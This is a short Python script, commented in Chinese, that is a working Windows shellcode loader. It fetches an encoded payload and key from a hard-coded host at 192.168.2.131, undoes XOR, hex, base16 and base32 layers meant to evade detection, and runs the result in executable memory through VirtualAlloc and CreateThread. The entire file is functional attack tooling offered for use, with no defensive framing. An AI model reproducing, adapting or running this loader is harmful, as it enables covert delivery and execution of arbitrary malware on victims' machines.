# -*- coding: UTF-8 -*-
import ctypes
import base64
import random
from sys import version_info
from urllib.request import urlopen


def decrypt(code, key):
    # 设置随机数
    random.seed(key)
    # 异或解密
    xor_code = code.split('.')
    res_code = ''
    for i in xor_code:
        res_code = res_code + chr(int(i) ^ random.randint(0, 255))
    # 三重解码
    if version_info >= (3,0):
        shellcode = bytes.fromhex(res_code)
    else:
        shellcode = res_code.decode('hex')
    shellcode = base64.b16decode(shellcode)
    shellcode = base64.b32decode(shellcode)
    return shellcode


def runcode(shellcode):
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)


def get_data(url_shellcode, url_key):
    """远程获取shellcode"""
    if version_info >= (3,0):
        from urllib.request import urlopen
    else:
        from urllib2 import urlopen
    # 远程加载shellcode, key
    key = urlopen(url_key).read().decode()
    shellcode = urlopen(url_shellcode).read().decode()
    return shellcode, key


if __name__ == "__main__":
    url_shellcode = "http://192.168.2.131/shellcode.txt"
    url_key = "http://192.168.2.131/key.txt"
    # 远程加载
    shellcode, key = get_data(url_shellcode, url_key)
    # 解码
    shellcode = decrypt(shellcode, key)
    # 加载shellcode
    runcode(shellcode)
